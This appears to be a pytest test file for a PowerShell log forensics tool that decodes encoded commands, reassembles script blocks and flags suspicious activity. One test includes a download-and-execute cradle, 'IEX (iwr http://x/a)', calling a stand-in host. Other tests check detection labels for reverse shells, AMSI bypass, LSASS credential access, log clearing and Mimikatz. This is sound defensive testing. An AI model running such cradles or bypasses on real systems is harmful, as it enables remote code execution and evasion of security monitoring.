from __future__ import annotations

import base64
import json

import pytest

from windows_pslogging.collect import collect
from windows_pslogging import decode as D
from windows_pslogging import flags as _flags
from windows_pslogging.cli import main

import _synth as S


def test_decode_encoded_command():
    b64 = base64.b64encode("Write-Host hi".encode("utf-16-le")).decode()
    out, notes = D.decode_payloads(f"powershell -enc {b64}")
    assert "Write-Host hi" in out
    assert any("EncodedCommand" in n for n in notes)


def test_decode_frombase64_gzip():
    import gzip
    payload = gzip.compress(b"IEX (iwr http://x/a)")
    b64 = base64.b64encode(payload).decode()
    src = f"$s=[Convert]::FromBase64String('{b64}')"
    out, notes = D.decode_payloads(src)
    assert "iwr http://x/a" in out
    assert any("compressed" in n for n in notes)


def test_scriptblock_reassembly(tmp_path):
    p = tmp_path / "Microsoft-Windows-PowerShell%4Operational.evtx"
    p.write_bytes(S.build_evtx())
    res = collect([str(p)])
    sbs = {s.scriptblock_id: s for s in res.scripts
           if s.kind == "scriptblock"}
    evil = sbs["sb-evil"]
    assert evil.fragments == 2
    # part 1 (TCPClient) comes before part 2 (AmsiUtils) in the text
    assert evil.text.index("TCPClient") < evil.text.index("AmsiUtils")
    assert evil.time == "2026-03-16T10:00:01Z"
    assert evil.computer == "WS01"


def test_flags(tmp_path):
    p = tmp_path / "ps.evtx"
    p.write_bytes(S.build_evtx())
    res = collect([str(p)])
    by = {}
    for s in res.scripts:
        by.setdefault(s.scriptblock_id or s.kind, []).append(s)

    evil = by["sb-evil"][0]
    j = " ".join(evil.notable)
    assert "reverse shell / raw socket" in j
    assert "AMSI / ETW bypass string" in j
    assert "credential / LSASS access" in j
    assert _flags.severity(evil.notable) == "high"

    module = next(s for s in res.scripts if s.kind == "module")
    assert any("EncodedCommand" in n for n in module.decode_notes)
    assert any("download / execute cradle" in n for n in module.notable)

    benign = by["sb-benign"][0]
    assert not benign.notable


def test_transcript(tmp_path):
    t = tmp_path / "PowerShell_transcript.WS01.abc.20260316113000.txt"
    t.write_text(S.TRANSCRIPT)
    res = collect([str(t)])
    assert res.transcripts == 1
    sc = next(s for s in res.scripts if s.kind == "transcript")
    assert sc.user == "WS01\\victim"
    assert sc.time == "2026-03-16T11:30:00Z"
    j = " ".join(sc.notable)
    assert "download / execute cradle" in j
    assert "clears event logs" in j


def test_cli_csv_json_filters(tmp_path):
    d = tmp_path / "logs"
    d.mkdir()
    (d / "Microsoft-Windows-PowerShell%4Operational.evtx").write_bytes(
        S.build_evtx())
    (d / "PowerShell_transcript.WS01.x.20260316113000.txt").write_text(
        S.TRANSCRIPT)
    csv_p = tmp_path / "p.csv"
    js_p = tmp_path / "p.json"
    rc = main([str(d), "--csv", str(csv_p), "--json", str(js_p), "-q"])
    assert rc == 0
    assert csv_p.read_bytes().startswith(b"\xef\xbb\xbf")
    data = json.loads(js_p.read_text())
    assert len(data) >= 5

    main([str(d), "--kind", "scriptblock", "--json", str(js_p), "-q"])
    got = json.loads(js_p.read_text())
    assert got and all(r["kind"] == "scriptblock" for r in got)

    main([str(d), "--min-severity", "high", "--json", str(js_p), "-q"])
    got = json.loads(js_p.read_text())
    assert got and all(r["severity"] == "high" for r in got)

    main([str(d), "--grep", "Mimikatz", "--json", str(js_p), "-q"])
    got = json.loads(js_p.read_text())
    assert got


def test_csv_injection_guard():
    from windows_pslogging.tracelib import sanitize
    assert sanitize("=1") == "'=1"


if __name__ == "__main__":
    raise SystemExit(pytest.main([__file__, "-q"]))
